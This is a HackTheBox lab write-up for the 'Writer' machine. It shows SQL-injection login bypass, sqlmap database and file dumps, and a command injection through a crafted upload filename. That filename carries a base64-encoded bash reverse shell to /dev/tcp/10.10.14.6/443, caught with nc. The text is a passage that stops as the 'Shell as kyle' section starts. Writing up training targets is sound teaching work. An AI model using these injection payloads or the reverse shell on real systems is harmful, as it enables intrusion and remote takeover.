---
title: HTB: Writer
url: https://0xdf.gitlab.io/2021/12/11/htb-writer.html
date: 2021-12-11T10:00:00+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, ctf, htb-writer, nmap, feroxbuster, sqli, injection, auth-bypass, ffuf, sqlmap, burp, burp-repeater, apache, flask, django, command-injection, hashcat, postfix, swaks, apt, oscp-plus-v2, oscp-like-v2
---

![Writer](https://0xdfimages.gitlab.io/img/writer-cover.png)

Writer was really hard for a medium box. There’s an SQL injection that provides both authentication bypass and file read on the system. The foothold involved either chaining togethers file uploads and file downloads to get a command injection, or using an SSRF to trigger a development site that is editable using creds found in the site files to access SMB. With a shell, the first pivot is using creds from the Django DB after cracking the hash. Then I’ll inject into a Postfix mail filter and trigger it be sending an email. Finally, there’s an editable apt config file that allows command injection as root. In beyond root, I’ll show the intended path using the SSRF to trigger the modified dev site.

## Box Info

| Name | [Writer](https://hackthebox.com/machines/writer)  [Writer](https://hackthebox.com/machines/writer) [Play on HackTheBox](https://hackthebox.com/machines/writer) |
| --- | --- |
| Release Date | [31 Jul 2021](https://twitter.com/hackthebox_eu/status/1420353511062220804) |
| Retire Date | 11 Dec 2021 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Writer |
| Radar Graph | Radar chart for Writer |
| First Blood User | 01:48:36[clubby789 clubby789](https://app.hackthebox.com/users/83743) |
| First Blood Root | 02:26:11[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| Creator | [TheCyberGeek TheCyberGeek](https://app.hackthebox.com/users/114053) |

## Recon

### nmap

`nmap` found four open TCP ports, SSH (22), HTTP (80), and SMB/Samba (139/445):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.101
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-04 04:32 EDT
Nmap scan report for 10.10.11.101
Host is up (0.065s latency).
Not shown: 65531 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 106.36 seconds
oxdf@parrot$ nmap -p 22,80,139,445 -sCV -oA nmap/tcpscripts 10.10.11.101
Failed to open normal output file nmap/tcpscripts.nmap for writing
QUITTING!
oxdf@parrot$ nmap -p 22,80,139,445 -sCV -oA scans/nmap-tcpscripts 10.10.11.101
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-04 04:36 EDT
Nmap scan report for 10.10.11.101
Host is up (0.021s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)
|   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)
|_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Story Bank | Writer.HTB
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 3m59s
|_nbstat: NetBIOS name: WRITER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-04T08:40:57
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.80 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 20.04 Focal.

### SMB - TCP 445

`smbmap` identifies a few shares, but I can’t access anything without creds:

```

oxdf@parrot$ smbmap -H 10.10.11.101
[+] IP: 10.10.11.101:445        Name: 10.10.11.101                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        writer2_project                                         NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (writer server (Samba, Ubuntu))

```

### Website - TCP 80

#### Site

The site is a blog called Story Bank:

[![image-20210904045955772](https://0xdfimages.gitlab.io/img/image-20210904045955772.png)](https://0xdfimages.gitlab.io/img/image-20210904045955772.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210904045955772.png)

Clicking on various posts leads to `/blog/post/[id]`. I don’t see anything interesting here. I tried adding a `'` to the end of the url to see if it might cause an SQL error, but it didn’t.

The menu has an about page (`/about`) which is static content, as well as a contact page (`/contact`) which contains a form:

![image-20210904050222226](https://0xdfimages.gitlab.io/img/image-20210904050222226.png)

Filling that out and hitting send creates GET request to a PHP page:

```

GET /contact.php?name=0xdf&email=0xdf@writer.htb&comment=test&_=1630746045200 HTTP/1.1
Host: 10.10.11.101
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
DNT: 1
Connection: close
Referer: http://10.10.11.101/contact

```

The server returns 404 not found.

#### Tech Stack

Most of the urls are directory style (like `/contact` and `/about`). `/index.html` and `/index.php` both returned 404. This is common with Python and Ruby based frameworks. However, I also got the single `.php` page with the contact form. Then again, it didn’t exist. At this point it’s hard to say.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` just in case, even though it doesn’t seem like a PHP site at this point:

```

oxdf@parrot$ feroxbuster -u http://10.10.11.101 -x php 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.101
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
302        4l       24w      208c http://10.10.11.101/logout
200      110l      347w     4905c http://10.10.11.101/contact
200       75l      320w     3522c http://10.10.11.101/about
301        9l       28w      313c http://10.10.11.101/static
301        9l       28w      318c http://10.10.11.101/static/blog
301        9l       28w      316c http://10.10.11.101/static/js
301        9l       28w      317c http://10.10.11.101/static/css
301        9l       28w      324c http://10.10.11.101/static/components
301        9l       28w      317c http://10.10.11.101/static/img
301        9l       28w      322c http://10.10.11.101/static/blog/css
301        9l       28w      321c http://10.10.11.101/static/blog/js
301        9l       28w      324c http://10.10.11.101/static/blog/fonts
301        9l       28w      318c http://10.10.11.101/static/font
302        4l       24w      208c http://10.10.11.101/dashboard
301        9l       28w      320c http://10.10.11.101/static/vendor
301        9l       28w      327c http://10.10.11.101/static/vendor/jquery
301        9l       28w      332c http://10.10.11.101/static/components/sidebar
301        9l       28w      331c http://10.10.11.101/static/components/navbar
403        9l       28w      277c http://10.10.11.101/server-status
200       35l       99w     1443c http://10.10.11.101/administrative
[####################] - 4m    899970/899970  0s      found:20      errors:940    
[####################] - 4m     59998/59998   215/s   http://10.10.11.101
[####################] - 3m     59998/59998   261/s   http://10.10.11.101/static
[####################] - 3m     59998/59998   261/s   http://10.10.11.101/static/blog
[####################] - 3m     59998/59998   261/s   http://10.10.11.101/static/js
[####################] - 3m     59998/59998   259/s   http://10.10.11.101/static/css
[####################] - 3m     59998/59998   260/s   http://10.10.11.101/static/components
[####################] - 3m     59998/59998   261/s   http://10.10.11.101/static/img
[####################] - 3m     59998/59998   259/s   http://10.10.11.101/static/blog/css
[####################] - 3m     59998/59998   259/s   http://10.10.11.101/static/blog/js
[####################] - 3m     59998/59998   257/s   http://10.10.11.101/static/blog/fonts
[####################] - 3m     59998/59998   258/s   http://10.10.11.101/static/font
[####################] - 3m     59998/59998   256/s   http://10.10.11.101/static/vendor
[####################] - 3m     59998/59998   254/s   http://10.10.11.101/static/vendor/jquery
[####################] - 3m     59998/59998   258/s   http://10.10.11.101/static/components/sidebar
[####################] - 3m     59998/59998   271/s   http://10.10.11.101/static/components/navbar

```

`/logout` is interesting because it implies there’s a login capability that I haven’t found yet. `/dashboard` could be interesting, but it just returns a redirect back to `/`. `/administrative` presents a login page:

![image-20210904051600396](https://0xdfimages.gitlab.io/img/image-20210904051600396.png)

## Shell as www-data

### SQLi Bypass Login

#### Manually

Whenever I see a login form and say “I tried some basic SQL injections but didn’t find anything”, one of the things I always try is a username of `admin' or 1=1 limit 1;-- -`. This proposes that the server is doing an SQL query that looks something like:

```

select * from users where username = '[username]' and password = hash('[password]');

```

The injection would make it:

```

select * from users where username = 'admin' or 1=1 limit 1;-- -' and password = [hash];

```

`limit 1` is necessary if the code is checking for exactly one row returned, which is best practice. Sometime it may just check for any returns, or there may only be one account (less common in real life, but not uncommon in CTFs).

On submitting that username, it works, first showing a redirect page:

![image-20210904053030686](https://0xdfimages.gitlab.io/img/image-20210904053030686.png)

And then a dashboard:

[![image-20210904053048388](https://0xdfimages.gitlab.io/img/image-20210904053048388.png)](https://0xdfimages.gitlab.io/img/image-20210904053048388.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210904053048388.png)

#### By Fuzzing

If I didn’t want to manually test these kinds of SQL injections, there’s a neat set of wordlists in [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/SQLi) for fuzzing SQL that can be used with `ffuf` or `wfuzz`:

![image-20210904054358666](https://0xdfimages.gitlab.io/img/image-20210904054358666.png)

I’ll run `ffuf` with the following options:
- `-X POST` - POST request
- `-u http://10.10.11.101/administrative` - url to send to
- `-d 'uname=FUZZ&password=0xdf'` - data to send, with `FUZZ` being what gets replaced with lines from the wordlist
- ` -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt` - the wordlist
- `-H "Content-Type: application/x-www-form-urlencoded"` - set the header like in the actual request

On running this, there’s 300+ lines of output. I can see that the size of each varies, but the default case seems to have 206 words. I’ll add one more option, `--fw 206` to hide those lines. What remains are payloads that do something different:

```

oxdf@parrot$ ffuf -X POST -u http://10.10.11.101/administrative -d 'uname=FUZZ&password=0xdf' -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt -x http://127.0.0.1:8080 -H "Content-Type: application/x-www-form-urlencoded" --fw 206

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.11.101/administrative
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : uname=FUZZ&password=0xdf
 :: Follow redirects : false
 :: Calibration      : false
 :: Proxy            : http://127.0.0.1:8080
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 206
________________________________________________

admin' or '             [Status: 200, Size: 1296, Words: 280, Lines: 33]
hi' or 'x'='x';         [Status: 200, Size: 1296, Words: 280, Lines: 33]
x' or 1=1 or 'x'='y     [Status: 200, Size: 1296, Words: 280, Lines: 33]
' or 1=1 or ''='        [Status: 200, Size: 1296, Words: 280, Lines: 33]
' or 0=0 #              [Status: 200, Size: 1296, Words: 280, Lines: 33]
:: Progress: [267/267] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::

```

There’s five examples of other payloads that would allow for login.

### Enumerate Dashboard

In addition to the static dashboard shown above, there’s a few more routes, available via the menu on the left side.

`/dashboard/stories` gives a control panel for the various blog posts on the main site:

![image-20210906200206998](https://0xdfimages.gitlab.io/img/image-20210906200206998.png)

I can edit pages here, and it shows up on the main site:

![image-20211201135434066](https://0xdfimages.gitlab.io/img/image-20211201135434066.png)

`/dashboard/users` shows a single user, admin:

![image-20210906200225911](https://0xdfimages.gitlab.io/img/image-20210906200225911.png)

`/dashboard/settings` gives settings:

![image-20210906200306510](https://0xdfimages.gitlab.io/img/image-20210906200306510.png)

The other panels include System:

![image-20210906200336447](https://0xdfimages.gitlab.io/img/image-20210906200336447.png)

Email:

![image-20210906200350760](https://0xdfimages.gitlab.io/img/image-20210906200350760.png)

And Appearance:

![image-20210906200406067](https://0xdfimages.gitlab.io/img/image-20210906200406067.png)

Nothing obvious jumps out here as to where to go next.

### File Read

#### Manual SQLi

When I logged into the site, it first showed a page with a quick welcome before almost instantly redirecting into the main page. I’ll note that on the dashboard it has the SQLi payload as my username:

![image-20210906200513168](https://0xdfimages.gitlab.io/img/image-20210906200513168.png)

But on the welcome page, it said admin:

![image-20210906200714463](https://0xdfimages.gitlab.io/img/image-20210906200714463.png)

It’s easier to follow in Burp Repeater:

![image-20210906202235472](https://0xdfimages.gitlab.io/img/image-20210906202235472.png)

I can try a UNION injection here. Just like above, I’ll still guess that the SQL query looks like:

```

select * from users where username = '[username]' and password = hash('[password]');

```

Passing in a username of `' UNION select 1;-- -` will create:

```

select * from users where username = '' UNION select 1;-- -' and password = hash('[password]');

```

If the `*` returns one column, this query will work. Otherwise it will fail. It fails:

![image-20210906202635159](https://0xdfimages.gitlab.io/img/image-20210906202635159.png)

I’ll try adding numbers to the second `SELECT` until it works (I see “Welcome 2” in the page and the message about redirecting):

![image-20210906202717864](https://0xdfimages.gitlab.io/img/image-20210906202717864.png)

I’ve learned two things here. The SQL query returns six columns, and username is in the second column.

Now I can replace that `2` with things I want to read. So making it `database()` returns the current database, writer:

![image-20210906203403105](https://0xdfimages.gitlab.io/img/image-20210906203403105.png)

I can list the databases with a query to the `information_schema` DB:

![image-20210907094512931](https://0xdfimages.gitlab.io/img/image-20210907094512931.png)

There’s two DBs in there, `information_schema` and `writer`. That’s not immediately obvious, but it’s just jamming all the rows together. I can make that a bit more readable with `group_concat`:

![image-20210907094715089](https://0xdfimages.gitlab.io/img/image-20210907094715089.png)

#### sqlmap

I could continue manually, but `sqlmap` also works here. I’ll save one of the requests to login, and make sure there’s no injection in it:

```

POST /administrative HTTP/1.1
Host: 10.10.11.101
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Origin: http://10.10.11.101
DNT: 1
Connection: close
Referer: http://10.10.11.101/administrative
Upgrade-Insecure-Requests: 1

uname=admin&password=password

```

Now I can pass that to `sqlmap`:

```

oxdf@parrot$ sqlmap -r login.req
...[snip]...
got a refresh intent (redirect like response common to login pages) to '/dashboard'. Do you want to apply it from now on? [Y/n] n
[13:11:24] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[13:11:24] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[13:11:24] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[13:11:35] [INFO] POST parameter 'uname' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
[13:11:40] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[13:11:40] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[13:11:40] [INFO] target URL appears to be UNION injectable with 6 columns
[13:11:41] [INFO] POST parameter 'uname' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'uname' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 74 HTTP(s) requests:
---
Parameter: uname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin' AND (SELECT 7088 FROM (SELECT(SLEEP(5)))exRW) AND 'ensx'='ensx&password=password

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: uname=admin' UNION ALL SELECT NULL,CONCAT(0x71717a7871,0x425661596272756b4b514b6256615342427047497762494465795943666c5051615368477176556d,0x716b627a71),NULL,NULL,NULL,NULL-- -&password=password
---
...[snip]...

```

The first line after the `...[snip]...` above shows it asking about the redirect. By default, `sqlmap` will follow the redirect, and therefore it will miss the union injection because the results don’t show up in the redirected page. If I accept the default there (or run with `--batch`) it will only find the time-based injection, which is *really* slow.

#### Database Enumeration

Now `sqlmap` can show what’s in the DB. First list the databases (making sure not to follow the redirect):

```

oxdf@parrot$ sqlmap -r login.req --dbs
...[snip]...
got a refresh intent (redirect like response common to login pages) to '/dashboard'. Do you want to apply it from now on? [Y/n] n
available databases [2]:
[*] information_schema
[*] writer
...[snip]...

```

List the tables in `writer` (not shown, but telling it not to follow the redirect every time from now on):

```

oxdf@parrot$ sqlmap -r login.req -D writer --tables
...[snip]...
Database: writer
[3 tables]
+---------+
| site    |
| stories |
| users   |
+---------+
...[snip]...

```

Show the data in each table:

```

oxdf@parrot$ sqlmap -r login.req -D writer -T site --dump
...[snip]...
Database: writer
Table: site
[1 entry]
+------+---------------+------------+------------------+------------+----------------------------------------------------------+
| id   | logo          | title      | favicon          | ganalytics | description                                              |
+------+---------------+------------+------------------+------------+----------------------------------------------------------+
| 1    | /img/logo.png | Story Bank | /img/favicon.ico | <blank>    | This is a site where I publish my own and others stories |
+------+---------------+------------+------------------+------------+----------------------------------------------------------+
...[snip]...
oxdf@parrot$ sqlmap -r login.req -D writer -T stories --dump
...[snip]...
oxdf@parrot$ sqlmap -r login.req -D writer -T users --dump
...[snip]...
Database: writer
Table: users
[1 entry]
+------+------------------+--------+----------+----------------------------------+--------------+
| id   | email            | status | username | password                         | date_created |
+------+------------------+--------+----------+----------------------------------+--------------+
| 1    | admin@writer.htb | Active | admin    | 118e48794631a9612484ca8b55f622d0 | NULL         |
+------+------------------+--------+----------+----------------------------------+--------------+
...[snip]...

```

I didn’t show the output for `stories`, as it was a lot, but it matched up with the stories on the main site.

That hash doesn’t crack against any wordlists I tried.

#### Privileges

The `--privileges` flag in `sqlmap` will show that the current user can read files:

```

oxdf@parrot$ sqlmap -r login.req --privileges
...[snip]...
database management system users privileges:
[*] 'admin'@'localhost' [1]:
    privilege: FILE
...[snip]...

```

For example, giving it `--file-read=/etc/lsb-release` returns the file:

```

oxdf@parrot$ cat /home/oxdf/.sqlmap/output/10.10.11.101/files/_etc_lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.2 LTS"

```

I can also do a manual file read by logging in, and then sending that request to Burp Repeater:

![image-20211202133208422](https://0xdfimages.gitlab.io/img/image-20211202133208422.png)

### File System Enumeration

#### Users

The `/etc/passwd` file shows four users that can get shells:

```

oxdf@parrot$ cat /home/oxdf/.sqlmap/output/10.10.11.101/files/_etc_passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
kyle:x:1000:1000:Kyle Travis:/home/kyle:/bin/bash
filter:x:997:997:Postfix Filters:/var/spool/filter:/bin/sh
john:x:1001:1001:,,,:/home/john:/bin/bash

```

I tried to read `user.txt` and `id_rsa` files out of any of their home dirs, but without luck.

#### Web Config

I’ll pull the config for enabled sites from Apache (`/etc/apache2/sites-enabled/000-default.conf`) to see where the web root is located.

```

<VirtualHost *:80>
        ServerName writer.htb
        ServerAdmin admin@writer.htb
        WSGIScriptAlias / /var/www/writer.htb/writer.wsgi
        <Directory /var/www/writer.htb>
                Order allow,deny
                Allow from all
        </Directory>
        Alias /static /var/www/writer.htb/writer/static
        <Directory /var/www/writer.htb/writer/static/>
                Order allow,deny
                Allow from all
        </Directory>
        ErrorLog ${APACHE_LOG_DIR}/error.log
        LogLevel warn
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

# Virtual host configuration for dev.writer.htb subdomain
# Will enable configuration after completing backend development
# Listen 8080
#<VirtualHost 127.0.0.1:8080>
#       ServerName dev.writer.htb
#       ServerAdmin admin@writer.htb
#
        # Collect static for the writer2_project/writer_web/templates
#       Alias /static /var/www/writer2_project/static
#       <Directory /var/www/writer2_project/static>
#               Require all granted
#       </Directory>
#
#       <Directory /var/www/writer2_project/writerv2>
#               <Files wsgi.py>
#                       Require all granted
#               </Files>
#       </Directory>
#
#       WSGIDaemonProcess writer2_project python-path=/var/www/writer2_project python-home=/var/www/writer2_project/writer2env
#       WSGIProcessGroup writer2_project
#       WSGIScriptAlias / /var/www/writer2_project/writerv2/wsgi.py
#        ErrorLog ${APACHE_LOG_DIR}/error.log
#        LogLevel warn
#        CustomLog ${APACHE_LOG_DIR}/access.log combined
#
#</VirtualHost>
# vim: syntax=apache ts=4 sw=4 sts=4 sr noet

```

There are two web applications described there. The main web app is hosted from `/var/www/writer.htb`, and the file `writer.wsgi` is specifically called out.

There’s a dev webapp as well that doesn’t seem to be complete yet. It does reference `/var/www/writer2_project` and a `wsgi.py` file as well, as well as that it would run on localhost 8080 (which is why I didn’t see it in my original `nmap`, if it is running at all).

#### writer.htb

I can pull the source code for the site, starting with the `writer.wsgi` file. WSGI is an interface for how Python applications can be hosted by something like Apache or NGINX. This file is the root of the app:

```

#!/usr/bin/python
import sys
import logging
import random
import os

# Define logging
logging.basicConfig(stream=sys.stderr)
sys.path.insert(0,"/var/www/writer.htb/")

# Import the __init__.py from the app folder
from writer import app as application
application.secret_key = os.environ.get("SECRET_KEY", "")

```

The signing key is held in an environment variable, so I can’t get to it. It does import `app`. There’s a few ways this `from writer import app` could work:
- It could import an `app` object from a `writer.py` file in the same dir.
- It could import everything from `writer/app.py`.
- It could import an `app` object from `writer/__init__.py`. `__init__.py` is kind of like `index.html` for webpages. It’s the default file for a module.

Given the comment, it’s likely the third option.

`__init__.py` in this case is the main Flask application. It’s almost 300 lines long, so I’ll only include some highlights.

There are some database creds:

```

connector = mysql.connector.connect(user='admin', password='ToughPasswordToCrack', host='127.0.0.1', database='writer')

```

There’s potential for an SSRF in this code which shows up similarly in both `/dashboard/stories/add` and `/dashboard/stories/edit/<id>` :

```

        if request.form.get('image_url'):
            image_url = request.form.get('image_url')
            if ".jpg" in image_url:
                try:
                    local_filename, headers = urllib.request.urlretrieve(image_url)
                    os.system("mv {} {}.jpg".format(local_filename, local_filename))
                    image = "{}.jpg".format(local_filename)

```

There’s also potential command injection in the `os.system` call.

### Command Injection

#### Add Story

I’ll focus on the `/dashboard/stories/add` path to get execution. Back in the dashboard, authenticated via SQLi, clicking on the link on the stories dashboard to add a new one leads to a form:

![image-20211201152958822](https://0xdfimages.gitlab.io/img/image-20211201152958822.png)

Clicking on “here” in “Click here to upload from URL” changes the form:

![image-20211201153048945](https://0xdfimages.gitlab.io/img/image-20211201153048945.png)

When I submit a POST, it looks like:

```

POST /dashboard/stories/add HTTP/1.1
Host: 10.10.11.101
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------308491540134145397733663667542
Content-Length: 2379
Origin: http://10.10.11.101
Connection: close
Referer: http://10.10.11.101/dashboard/stories/add
Cookie: session=eyJ1c2VyIjoiYWRtaW4nIG9yIDE9MTstLSJ9.YafFjA.MEKbPDJsnK-kqpvLzluSIsyus3Y
Upgrade-Insecure-Requests: 1
-----------------------------308491540134145397733663667542
Content-Disposition: form-data; name="author"

0xdf
-----------------------------308491540134145397733663667542
Content-Disposition: form-data; name="title"

Test Post
-----------------------------308491540134145397733663667542
Content-Disposition: form-data; name="tagline"

This is a test
-----------------------------308491540134145397733663667542
Content-Disposition: form-data; name="image"; filename="JPEG_example_JPG_RIP_001.jpg"
Content-Type: image/jpeg

ÿØÿà
...[snip]...
-----------------------------308491540134145397733663667542
Content-Disposition: form-data; name="image_url"
-----------------------------308491540134145397733663667542
Content-Disposition: form-data; name="content"

This post is just a test
-----------------------------308491540134145397733663667542--

```

If I gave it a url, then then `image_url` field is populated, and the `image` field is empty.

The form for editing a story is very similar.

#### Identify Command Injection

If the method is a POST, both endpoints will make it to this block:

```

        if request.form.get('image_url'):
            image_url = request.form.get('image_url')
            if ".jpg" in image_url:
                try:
                    local_filename, headers = urllib.request.urlretrieve(image_url)
                    os.system("mv {} {}.jpg".format(local_filename, local_filename))
                    image = "{}.jpg".format(local_filename)
                    try:
                        im = Image.open(image)
                        im.verify()
                        im.close()
                        image = image.replace('/tmp/','')
                        os.system("mv /tmp/{} /var/www/writer.htb/writer/static/img/{}".format(image, image))
                        image = "/img/{}".format(image)
                        cursor = connector.cursor()
                        cursor.execute("UPDATE stories SET image = %(image)s WHERE id = %(id)s", {'image':image, 'id':id})
                        result = connector.commit()

```

I want to get to that `os.system` call on the sixth line above. Unfortunately, to do so, there are hurdles.

First, the `urllib.request.urlretrieve(image_url)` must not error, which means the url must be valid and not throw an exception.

I was a bit confused by all the renaming, until I opened a Python terminal and used `urllib.request.urlretrieve` myself:

```

>>> local_filename, headers = urllib.request.urlretrieve('http://10.10.14.6/test.jpg')
>>> local_filename
'/tmp/tmpa7gaq4yh'

```

So it is stored in `/tmp`, and with no extension. That’s why the code is adding `.jpg` to the end. However, there’s another kind of valid url, and this time it preserves the filename:

```

>>> local_filename, headers = urllib.request.urlretrieve('file:///home/oxdf/test.jpg')
>>> local_filename
'/home/oxdf/test.jpg'

```

So if I can have it point to an existing file, and that filename has command injection in it, I should be able to get execution.

#### RCE POC

I’ll create a file with the following name:

```

oxdf@parrot$ echo 'ping -c 1 10.10.14.6' | base64 
cGluZyAtYyAxIDEwLjEwLjE0LjYK
oxdf@parrot$ touch '0xdf.jpg; echo cGluZyAtYyAxIDEwLjEwLjE0LjYK|base64 -d|bash;' 

```

I’ll upload this to Writer using the form, and I can see it on the server:

![image-20211201211453785](https://0xdfimages.gitlab.io/img/image-20211201211453785.png)

I’ll send the POST to repeater, and clear out the `image` section, and fill in the `image_url` section:

![image-20211201211604634](https://0xdfimages.gitlab.io/img/image-20211201211604634.png)

When I send that, it will be passed to `urllib.request.urlretrieve`, which will return `local_filename` of `/var/www/writer.htb/writer/static/img/0xdf.jpg; echo cGluZyAtYyAxIDEwLjEwLjE0LjYK|base64 -d|bash;`. The string that gets passed into `os.system` will be:

```

mv /var/www/writer.htb/writer/static/img/0xdf.jpg; echo cGluZyAtYyAxIDEwLjEwLjE0LjYK|base64 -d|bash; /var/www/writer.htb/writer/static/img/0xdf.jpg; echo cGluZyAtYyAxIDEwLjEwLjE0LjYK|base64 -d|bash;.jpg

```

When I send that, I get a ping:

```

oxdf@parrot$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
21:07:15.179144 IP 10.10.11.101 > 10.10.14.6: ICMP echo request, id 6, seq 1, length 64
21:07:15.179164 IP 10.10.14.6 > 10.10.11.101: ICMP echo reply, id 6, seq 1, length 64

```

#### Shell

To get a shell, I’ll modify the file name:

```

oxdf@parrot$ echo 'bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"' | base64 
YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxIgo=
oxdf@parrot$ touch 'test.jpg; echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxIgo=|base64 -d|bash;'

```

I’ll upload that file by editing a post, and verify it’s on Writer:

[![image-20211201212327224](https://0xdfimages.gitlab.io/img/image-20211201212327224.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211201212327224.png)

Now I’ll modify the request in Burp to get that by url:

![image-20211201212618719](https://0xdfimages.gitlab.io/img/image-20211201212618719.png)

With `nc` listening, I’ll send that, and a shell comes back:

```

oxdf@parrot$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.101 51182
bash: cannot set terminal process group (1051): Inappropriate ioctl for device
bash: no job control in this shell
www-data@writer:/$ 

```

I’ll do a shell upgrade:

```

www-data@writer:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@writer:/$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@parrot$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@writer:/$ 

```

## Shell as kyle

### Enumeration

#### writer2\_project

In `/var/www` there are three folders:

```

www-data@writer:/var/www$ ls
